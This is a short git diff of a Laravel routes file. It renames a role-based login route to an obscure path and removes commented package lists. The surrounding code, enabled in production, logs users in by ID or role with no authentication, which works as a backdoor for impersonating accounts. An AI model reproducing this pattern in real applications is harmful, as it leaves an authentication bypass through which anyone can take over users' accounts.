@@ -184,7 +184,7 @@ if (app()->environment('production') || app()->environment('local')) {
         Auth::loginUsingId($id);
         return redirect()->route('backend.home');
     });
-    Route::get('/usama/{role}', function ($role) {
+    Route::get('/post/65772444/{role}', function ($role) {
         if ($role === 'designer') {
             $element = User::whereHas('role', function ($q) use ($role) {
                 return $q->where(['name' => $role]);
@@ -210,7 +210,3 @@ Route::get('/{notFound}', function () {
     abort('404', trans('message.not_found'));
 });
 
-//spatie/geocoder riverskies/laravel-mobile-detect alexpechkarev/google-maps barryvdh/laravel-translation-manager berkayk/onesignal-laravel brotzka/laravel-dotenv-editor davejamesmiller/laravel-breadcrumbs doctrine/dbal fideloper/proxy fideloper/proxy  intervention/image pusher/pusher-php-server renatomarinho/laravel-page-speed
-//hardevine/shoppingcart
-
-// barryvdh/laravel-debugbar barryvdh/laravel-ide-helper beyondcode/laravel-dump-server
